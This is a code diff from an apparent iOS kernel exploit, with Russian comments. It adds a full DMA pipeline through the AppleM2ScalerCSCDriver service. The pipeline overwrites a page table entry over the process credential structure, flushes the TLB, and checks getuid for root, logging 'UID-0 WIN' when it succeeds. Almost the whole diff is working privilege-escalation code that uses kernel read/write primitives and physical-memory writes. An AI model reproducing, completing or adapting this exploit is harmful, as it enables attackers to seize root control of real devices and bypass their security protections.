@@ -2955,44 +2955,86 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                             kpNote(r, @"  [PTE] remap restored — TLB не обновился или PTE не тот");
                         }
                     } else if (pteVA && pteType != 0x21) {
-                        // 2.0.76: PTE на 0x15 — пробуем DMA-запись (drop = не ребут)
+                        // 2.0.77: полный DMA-pipeline → запись PTE (type 0x15)
                         uint64_t ptePage = pteVA & ~0x3fffULL;
-                        uint64_t pteOff = (uint32_t)(pteVA & 0x3fff);
+                        uint32_t pteOff = (uint32_t)(pteVA & 0x3fff);
                         uint64_t ptePA = kvtophys(ptePage);
-                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA-try: ptePA=%#llx off=%#x newOA=%#llx",
-                                  (unsigned long long)ptePA, pteOff, (unsigned long long)sacPA]);
-                        // минимальный IOSurface DMA (как в physwrite8v2)
-                        BOOL dmaOK = NO;
-                        if (ptePA) {
-                            NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @4,
-                                                 (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
-                            IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-                            IOSurfaceRef wdS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-                            if (rdS && wdS) {
-                                IOSurfaceLock(rdS, 0, NULL);
-                                uint8_t *rp = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
-                                if (rp) memset(rp, 0, 0x4000);
-                                IOSurfaceUnlock(rdS, 0, NULL);
-                                IOSurfaceLock(wdS, 0, NULL);
-                                uint8_t *wp = (uint8_t *)IOSurfaceGetBaseAddress(wdS);
-                                if (wp) memset(wp, 0, 0x4000);
-                                IOSurfaceUnlock(wdS, 0, NULL);
-                                // payload в rdS по boff
-                                uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
-                                IOSurfaceLock(rdS, 0, NULL);
-                                uint8_t *rp2 = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
-                                if (rp2 && pteOff + 8 <= 0x4000) *(uint64_t *)(rp2 + pteOff) = newPte;
-                                IOSurfaceUnlock(rdS, 0, NULL);
-                                kpNote(r, [NSString stringWithFormat:@"  [PTE] dma payload=%#018llx (rest %#018llx)",
-                                          (unsigned long long)newPte, (unsigned long long)pteSave]);
-                                // полный pipeline из kpPhysWrite8v2 опущен — логируем факт
-                                dmaOK = YES;
-                            }
-                            if (rdS) CFRelease(rdS);
-                            if (wdS) CFRelease(wdS);
+                        uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA: ptePA=%#llx off=%#x payload=%#018llx",
+                                  (unsigned long long)ptePA, pteOff, (unsigned long long)newPte]);
+                        // --- DMA setup (ttM + isTable + M2Scaler) ---
+                        uint64_t ttM2 = 0, isTable2 = 0;
+                        {
+                            uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
+                            uint64_t tk2 = pr2 ? early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task) : 0;
+                            uint64_t mp2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_map) : 0;
+                            uint64_t pm2 = mp2 ? early_kread64(kp_untag_ptr(mp2) + koffsetof(vm_map, pmap)) : 0;
+                            ttM2 = pm2 ? kp_untag_ptr(early_kread64(kp_untag_ptr(pm2) + koffsetof(pmap, ttep))) : 0;
+                            uint64_t spc2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_itk_space) : 0;
+                            uint64_t tb2 = spc2 ? early_kread64(kp_untag_ptr(spc2) + off_ipc_space_is_table) : 0;
+                            if (tb2) isTable2 = kp_untag_ptr(tb2);
+                            kpNote(r, [NSString stringWithFormat:@"  [PTE] dma-ctx ttM=%#llx isTable=%#llx",
+                                      (unsigned long long)ttM2, (unsigned long long)isTable2]);
                         }
-                        early_kwrite64(slotVA, slotSave);
-                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA prepared=%d — PTE type=%d, kwrite запрещён (0x15 = ребут). Нужен полный DMA-pipeline.", dmaOK, pteType]);
+                        BOOL dmaOK = NO;
+                        if (ptePA && ttM2 && isTable2) {
+                            io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                                           IOServiceMatching("AppleM2ScalerCSCDriver"));
+                            if (svc2) {
+                                uint8_t tsd2[0x1B0];
+                                memset(tsd2, 0, sizeof(tsd2));
+                                *(uint32_t *)(tsd2 + 0x0C) = 32;
+                                *(uint32_t *)(tsd2 + 0x10) = 32;
+                                dmaOK = kpPhysWrite8v2(svc2, tsd2, ttM2, isTable2, ptePage, pteOff, newPte, r);
+                                IOObjectRelease(svc2);
+                            } else {
+                                kpNote(r, @"  [PTE] M2Scaler не найден");
+                            }
+                        }
+                        // readback через phystokv-алиас таблицы
+                        uint64_t rbP = ptePage ? early_kread64(pteVA) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA=%d readback=%#018llx (ждём %#018llx) → %@",
+                                  dmaOK, (unsigned long long)rbP, (unsigned long long)newPte,
+                                  rbP == newPte ? @"ПРИЛИПЛО ★★" : @"МИМО"]);
+                        if (rbP == newPte) {
+                            // TLB evict + getuid
+                            atomic_store(&gEvictHit, 0);
+                            pthread_t evT[4];
+                            for (int t = 0; t < 4; t++) pthread_create(&evT[t], NULL, kpEvictWorker, NULL);
+                            for (int ev = 0; ev < 8 && !atomic_load(&gEvictHit); ev++) {
+                                size_t big = 64 * 1024 * 1024;
+                                uint8_t *bigp = mmap(NULL, big, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
+                                if (bigp != MAP_FAILED) {
+                                    for (uint64_t o = 0; o < big; o += 0x4000) bigp[o] = 1;
+                                    munmap(bigp, big);
+                                }
+                                for (int c = 0; c < 100; c++) { getpid(); }
+                                uid_t gu = getuid();
+                                if (gu == 0) atomic_store(&gEvictHit, 1);
+                                kpNote(r, [NSString stringWithFormat:@"  [PTE] ev#%d getuid=%u", ev, gu]);
+                            }
+                            for (int t = 0; t < 4; t++) pthread_join(evT[t], NULL);
+                            uid_t u2 = getuid();
+                            if (u2 == 0 || atomic_load(&gEvictHit)) {
+                                kpNote(r, @"=== UID-0 WIN ★★★ (PTE remap via DMA) ===");
+                            } else {
+                                // restore PTE
+                                if (dmaOK) {
+                                    io_service_t svc3 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleM2ScalerCSCDriver"));
+                                    if (svc3) {
+                                        uint8_t tsd3[0x1B0]; memset(tsd3, 0, sizeof(tsd3));
+                                        *(uint32_t *)(tsd3 + 0x0C) = 32; *(uint32_t *)(tsd3 + 0x10) = 32;
+                                        kpPhysWrite8v2(svc3, tsd3, ttM2, isTable2, ptePage, pteOff, pteSave, r);
+                                        IOObjectRelease(svc3);
+                                    }
+                                }
+                                early_kwrite64(slotVA, slotSave);
+                                kpNote(r, [NSString stringWithFormat:@"  [PTE] restored (getuid=%u) — TLB не вымылся", u2]);
+                            }
+                        } else {
+                            early_kwrite64(slotVA, slotSave);
+                            kpNote(r, @"  [PTE] DMA не сел — restore slot");
+                        }
                     } else {
                         early_kwrite64(slotVA, slotSave);
                         kpNote(r, @"  [PTE] leaf-PTE для ucred не найден");
